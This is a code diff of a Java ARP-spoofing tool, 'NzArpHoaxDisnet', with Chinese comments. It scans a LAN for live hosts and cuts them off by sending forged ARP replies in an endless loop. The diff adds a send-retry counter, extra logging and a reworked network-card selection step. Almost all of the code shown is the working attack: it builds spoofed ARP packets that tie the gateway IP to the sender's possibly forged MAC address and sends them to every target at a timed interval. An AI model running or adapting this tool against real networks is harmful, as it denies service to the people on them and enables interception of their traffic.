@@ -52,6 +52,11 @@ public class NzArpHoaxDisnet {
     public static Boolean BL = true;
 
     /**
+     * 发送Packet重试次数
+     */
+    public static Integer RESENDNUM = 3;
+
+    /**
      * 手动选择网卡重试次数
      */
     public static Integer MANUALNUM = 6;
@@ -167,13 +172,14 @@ public class NzArpHoaxDisnet {
                 // 存活者IP
                 ALIVEIP1 = NetUtil.getAliveIp1(NETSEGMENT);
                 // 自动打开默认网卡（失败将自动切换为手动打开）
-                SENDER = selfOpenDevice();
+                SENDER = voluntarilyOpenDevice();
                 // 扫描并存储网段下所有存活主机的IP与MAC
                 IPANDMACS = findAllMacAddress(NETSEGMENT, DEVICE, IPLIS);
                 // 删除不断网的IP
                 IPLIS = removeArpNotDisnet(IPLIS, ARPNOTDISNETPATH, GATEWAYIP, MYIP);
             }
         } catch (Exception e) {
+            log.error("initialization configuration error.");
             e.printStackTrace();
         }
     }
@@ -182,19 +188,35 @@ public class NzArpHoaxDisnet {
      * 启动方法-欺骗网关-进行局域网断网
      */
     private static void hoaxGatewayDisnet() {
-        log.info("ArpHoaxDisnet starting success .............");
+        log.info("ArpHoaxDisnet starting success......");
+        int n = 0, v = 0;
         try {
             // 循环发送ARP应答包
             while (true) {
-                for (String tarip : IPLIS) {
+                try {
                     // 构造ARP包请求，并发送（MYMACARR -> 可伪造）
-                    SENDER.sendPacket(constractReqArps(MYMACARR, InetAddress.getByName(tarip), GATEWAYMACARR, GATEWAYIPOBJ, 2));
+                    for (String tarip : IPLIS) {
+                        SENDER.sendPacket(constractReqArps(MYMACARR, InetAddress.getByName(tarip), GATEWAYMACARR, GATEWAYIPOBJ, 2));
+                    }
+                    // 恢复正常
+                    if (n > 0) {
+                        n = 0;
+                    }
+                    v++;
+                    log.info("send packet " + v + " next.");
+                    // 休息TIME秒
+                    Thread.sleep((long) (TIME * 1000));
+                } catch (Exception e) {
+                    n++;
+                    log.warn("send packet error, retry " + (RESENDNUM - n + 1) + " next...");
+                    if (n == RESENDNUM) {
+                        throw new Exception("the number of runs out.");
+                    }
                 }
-                // 休息 TIME 秒
-                Thread.sleep((long) (TIME * 1000));
             }
         } catch (Exception e) {
-            log.error("ArpHoaxDisnet exception termination .............", e);
+            log.error("ArpHoaxDisnet exception termination.");
+            e.printStackTrace();
         }
     }
 
@@ -349,37 +371,41 @@ public class NzArpHoaxDisnet {
      *
      * @return
      */
-    private static JpcapSender selfOpenDevice() {
+    private static JpcapSender voluntarilyOpenDevice() {
         // 发送者设备
         JpcapSender sender = null;
         // 枚举网卡
         NetworkInterface[] devices = JpcapCaptor.getDeviceList();
         // 一、自动
-        for (int i = 0; i < devices.length; i++) {
-            // 1. 保存网卡
-            DEVICE = devices[i];
-            try {
-                // 2. 打开设备
-                sender = JpcapSender.openDevice(DEVICE);
-                // 构造ARP包请求，并发送（MYMACARR -> 可伪造）
-                sender.sendPacket(constractReqArps(MYMACARR, InetAddress.getByName(ALIVEIP1), GATEWAYMACARR, GATEWAYIPOBJ, 2));
-            } catch (Exception e) {
-                sender = null;
-                e.printStackTrace();
-            } finally {
-                // 3. 自动打开成功
-                if (sender != null) {
-                    log.info("自动选择的网卡为: " + DEVICE.description + ".");
-                    break;
+        try {
+            for (int i = 0; i < devices.length; i++) {
+                // 1. 保存网卡
+                DEVICE = devices[i];
+                try {
+                    // 2. 打开设备
+                    sender = JpcapSender.openDevice(DEVICE);
+                    // 构造ARP包请求，并发送（MYMACARR -> 可伪造）
+                    sender.sendPacket(constractReqArps(MYMACARR, InetAddress.getByName(ALIVEIP1), GATEWAYMACARR, GATEWAYIPOBJ, 2));
+                } catch (Exception e) {
+                    sender = null;
+                } finally {
+                    // 3. 自动打开成功
+                    if (sender != null) {
+                        log.info("自动选择的网卡为: " + DEVICE.description + ".");
+                        break;
+                    }
                 }
             }
+        } catch (Exception e) {
+            log.error("voluntarily open device error......");
+            e.printStackTrace();
         }
         // 二、手动
         // 打开失败（指定网卡不存在）
         if (sender == null) {
-            log.info("自动打开网卡失败. 正在尝试手动开启, 稍等......");
+            log.warn("自动打开网卡失败. 正在尝试手动开启......");
             // 手动选择并打开设备
-            sender = manualOpenDevice();
+            sender = manualOpenDevice(devices);
         }
         // 返回设备
         return sender;
@@ -390,37 +416,41 @@ public class NzArpHoaxDisnet {
      *
      * @return
      */
-    private static JpcapSender manualOpenDevice() {
+    private static JpcapSender manualOpenDevice(NetworkInterface[] devices) {
         // 发送者设备
         JpcapSender sender = null;
         // 枚举网卡
-        NetworkInterface[] devices = JpcapCaptor.getDeviceList();
         for (int i = 0; i < devices.length; i++) {
             log.info(i + "." + devices[i].description);
         }
         // 重试次数
         int n = 1;
-        while (n <= MANUALNUM) {
-            // 0. 选择网卡
-            log.info("选择一个网卡：");
-            // 1. 保存网卡 - 获得指定下标的网卡
-            DEVICE = devices[SCANNER.nextInt()];
-            try {
-                // 2. 打开设备
-                sender = JpcapSender.openDevice(DEVICE);
-                // 构造ARP包请求，并发送（MYMACARR -> 可伪造）
-                sender.sendPacket(constractReqArps(MYMACARR, InetAddress.getByName(ALIVEIP1), GATEWAYMACARR, GATEWAYIPOBJ, 2));
-            } catch (Exception e) {
-                sender = null;
-                log.info(DEVICE.description + ", 网卡打开失败, 还可重试" + (MANUALNUM - n) + "次.", e);
-            } finally {
-                // 3. 自动打开成功
-                if (sender != null) {
-                    log.info("手动选择的网卡为: " + DEVICE.description + ".");
-                    break;
+        try {
+            while (n <= MANUALNUM) {
+                // 0. 选择网卡
+                log.info("选择一个网卡：");
+                try {
+                    // 1. 保存网卡 - 获得指定下标的网卡
+                    DEVICE = devices[SCANNER.nextInt()];
+                    // 2. 打开设备
+                    sender = JpcapSender.openDevice(DEVICE);
+                    // 构造ARP包请求，并发送（MYMACARR -> 可伪造）
+                    sender.sendPacket(constractReqArps(MYMACARR, InetAddress.getByName(ALIVEIP1), GATEWAYMACARR, GATEWAYIPOBJ, 2));
+                } catch (Exception e) {
+                    sender = null;
+                    log.warn(DEVICE.description + ", 网卡打开失败, 还可重试 " + (MANUALNUM - n) + " 次.");
+                } finally {
+                    // 3. 自动打开成功
+                    if (sender != null) {
+                        log.info("手动选择的网卡为: " + DEVICE.description + ".");
+                        break;
+                    }
+                    n++;
                 }
-                n++;
             }
+        } catch (Exception e) {
+            log.error("manual open device error.");
+            e.printStackTrace();
         }
         // 返回设备
         return sender;
